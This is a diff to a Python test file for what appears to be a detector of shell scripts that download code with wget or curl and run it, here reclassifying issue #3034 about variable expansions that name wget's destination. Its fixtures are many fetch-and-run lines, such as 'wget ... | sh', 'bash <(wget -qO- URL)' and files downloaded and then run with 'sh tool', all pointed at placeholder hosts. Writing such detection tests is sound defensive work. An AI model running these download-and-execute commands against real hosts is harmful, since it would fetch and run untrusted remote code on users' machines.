@@ -33,9 +33,10 @@ been since #2344. On the 13 grids behind these pins (14,322 rows) 507 rows that 
 that run nothing: 937 of those are steps that fail where they stand (the shell takes the program text for a FILE's
 name) and 139 of the rest are the `X=s` rows, whose string is a positional parameter. `TestThePrice` pins the shapes.
 Left for other issues, pinned in `TestWhatStays`: the `$CMD` command word whose cluster is not its first word
-(#2671, #2900), three shapes of wget (#3033, #3034, #3035), the first pass alone, and four families a probe of the
+(#2671, #2900), two shapes of wget (#3033, #3035), the first pass alone, and three families a probe of the
 rule's own nouns found open on `main` as well: an expansion in FRONT of a written option word (#3042), a substitution
-in the string's slot (#3043), the value of a written `-O` (#3044), and a stream read through a `<(...)` (#3045).
+in the string's slot (#3043), and the value of a written `-O` (#3044). #3034's fail-closed file view also reports
+the two process-substitution rows filed as #3045; their direct stream binding remains a more precise reading.
 """
 import ast
 import contextlib
@@ -464,13 +465,44 @@ class TestAFetcherHandedAnExpansion(unittest.TestCase):
         self.assertEqual(BOTH, marks("X=-q\nwget $X %s\nsh i.sh\n" % URL))
         self.assertEqual(BOTH, marks("X=-q\nwget $X %s -O tool\nsh tool\n" % URL))
         self.assertEqual({BOTH}, under("wget $(echo -qO-) %s | cat\nsh i.sh\n" % URL))
-        # Nothing piped, nothing run: no report. `curl` beside an expansion is unread, as it was.
-        self.assertEqual(CLEAN, marks("wget $OPTS %s\n" % URL))
+        # #3034: a whole-word expansion beside a written URL may instead name the destination, so
+        # the file view is unread even when nothing is piped or run.
+        self.assertEqual(BOTH, marks("wget $OPTS %s\n" % URL))
         self.assertEqual(CLEAN, marks("wget -q \"$A\" \"$B\"\n"))
         # Two URLs written out hand no option on: wget writes two files and the pipe is empty. Truth for these
         # three and for curl's row: fetched only.
         self.assertEqual(CLEAN, marks("wget %s %s2 | sh\n" % (URL, URL)))
         self.assertEqual(BOTH, marks("curl $OPTS %s\n" % URL))
+
+    def test_3034_a_whole_word_expansion_may_name_wgets_destination(self):
+        # Each download lands in `tool` under all sixteen truth runners. The guard used to keep the
+        # written URL as wget's one operand and therefore bind only its basename, `i.sh`.
+        rows = (
+            "X='-O tool'\nwget $X %s\nsh tool\n" % URL,
+            'X=-Otool\nwget "$X" %s\nsh tool\n' % URL,
+            "X=-O\nwget $X tool %s\nsh tool\n" % URL,
+        )
+        for row in rows:
+            with self.subTest(row=row.splitlines()[0]):
+                self.assertEqual(BOTH, marks(row))
+        self.assertEqual({BOTH}, under("wget $(echo -O tool) %s\nsh tool\n" % URL))
+
+        # The checksum names the basename that wget does not write. It stops the ten `-e` truth
+        # runs and the remaining six run `tool`; it must not bless the unresolved transfer.
+        checked = ("X='-O tool'\nwget $X %s\n" % URL
+                   + 'echo "%s  i.sh" | sha256sum -c -\nsh tool\n' % ("0" * 64))
+        self.assertEqual(BOTH, marks(checked))
+
+        # #3034's expansion reading stands beside the pre-#2889 file view, never in its place.
+        with words.as_before():
+            self.assertEqual(CLEAN, marks(rows[0]))
+
+    def test_3034_controls_keep_their_readings(self):
+        # curl already fails closed on the extra operand; wget's benign option still binds the
+        # URL basename. With no written URL, two unknown operands remain the bounded clean case.
+        self.assertEqual(BOTH, marks("X='-o tool'\ncurl $X %s\nsh tool\n" % URL))
+        self.assertEqual(BOTH, marks("X=-q\nwget $X %s\nsh i.sh\n" % URL))
+        self.assertEqual(CLEAN, marks('wget -q "$A" "$B"\n'))
 
 
 class TestBesideNeverInstead(unittest.TestCase):
@@ -1216,11 +1248,10 @@ class TestWhatStays(unittest.TestCase):
             with self.subTest(words=words_):
                 self.assertEqual(CLEAN, marks("CMD=$(command -v sh)\nX=x\nY=-c\n%s %s\n" % (words_, P)))
 
-    def test_three_shapes_of_wget(self):
-        # #3033: two URLs read as the first. #3034: the destination in a variable. #3035: a stream only an expansion
-        # makes, saved to a file. Truth: runs, every one.
+    def test_two_shapes_of_wget(self):
+        # #3033: two URLs read as the first. #3035: a stream only an expansion makes, saved to a
+        # file. Truth: runs, every one.
         self.assertEqual(CLEAN, marks("wget https://example.test/a https://example.test/tool\nsh tool\n"))
-        self.assertEqual(CLEAN, marks("X='-O tool'\nwget $X %s\nsh tool\n" % URL))
         self.assertEqual({CLEAN}, under("wget $(echo -qO-) %s | tee tool\nsh tool\n" % URL))
         self.assertEqual(CLEAN, marks("X=-qO-\nwget $X %s > tool\nsh tool\n" % URL))
 
@@ -1247,10 +1278,11 @@ class TestWhatStays(unittest.TestCase):
         # #3044: the VALUE of a written `-O` or `-o` may be `-`. Open on `main` too. Truth: runs, all sixteen.
         self.assertEqual(CLEAN, marks("X=-\nwget -q -O $X %s | sh\n" % URL))
         self.assertEqual(CLEAN, marks("X=-\ncurl -fsSL -o $X %s | sh\n" % URL))
-        # #3045: a stream only an expansion makes may be read through a `<(...)`, where rule 4 adds its view to a
-        # PIPE. Open on `main` too. Truth: runs under both bashes, these two and the written twin `main` reports.
-        self.assertEqual(CLEAN, marks("X=-qO-\nbash <(wget $X %s)\n" % URL))
-        self.assertEqual(CLEAN, marks("X=-qO-\nsh < <(wget $X %s)\n" % URL))
+        # #3045: a stream only an expansion makes may be read through a `<(...)`. #3034's
+        # unresolved-file-view price now reports the two dynamic rows; binding that stream directly
+        # remains the more precise reading. Truth: both bashes run them and the written twin.
+        self.assertEqual(BOTH, marks("X=-qO-\nbash <(wget $X %s)\n" % URL))
+        self.assertEqual(BOTH, marks("X=-qO-\nsh < <(wget $X %s)\n" % URL))
         self.assertEqual(BOTH, marks("bash <(wget -qO- %s)\n" % URL))
 
     def test_the_first_pass_alone(self):
